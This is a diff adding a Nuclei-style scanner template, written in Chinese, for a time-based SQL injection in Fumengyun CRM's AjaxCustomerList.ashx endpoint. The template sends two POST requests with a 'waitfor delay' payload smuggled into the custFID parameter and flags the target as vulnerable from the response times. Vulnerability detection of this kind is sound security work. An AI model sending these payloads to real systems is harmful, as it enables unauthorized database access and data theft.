@@ -1,0 +1,27 @@
+id: fumengyun-crm-ajaxcustomerlist-ashx-sql-injection
+info:
+  name: 孚盟云CRM AjaxCustomerList.ashx SQL注入
+  author: 0dayPoc
+  severity: high
+  description: 上海孚盟软件有限公司孚盟云CRM系统中的 AjaxCustomerList.ashx 接口存在SQL注入漏洞。该漏洞允许未经身份验证的攻击者通过构造恶意SQL查询语句，非法获取数据库中的敏感数据（包括管理员凭证及用户隐私信息）。在特定权限配置下，攻击者可利用此漏洞在服务器端执行任意代码或部署恶意程序，进而完全控制目标服务器。
+  tags: 孚盟云CRM
+http:
+- raw:
+  - |
+    POST /m/Dingding/Ajax/AjaxCustomerList.ashx HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/x-www-form-urlencoded
+
+    method=GetCustomerInfoByFid&custFID=123';waitfor+delay+'0:0:5'--+
+  - |
+    POST /m/Dingding/Ajax/AjaxCustomerList.ashx HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/x-www-form-urlencoded
+
+    method=GetCustomerInfoByFid&custFID=123';waitfor+delay+'0:0:8'--+
+  matchers:
+  - type: dsl
+    dsl:
+    - duration_1>=5 && duration_1<=6
+    - duration_2>=8 && duration_2<=9
+    condition: and
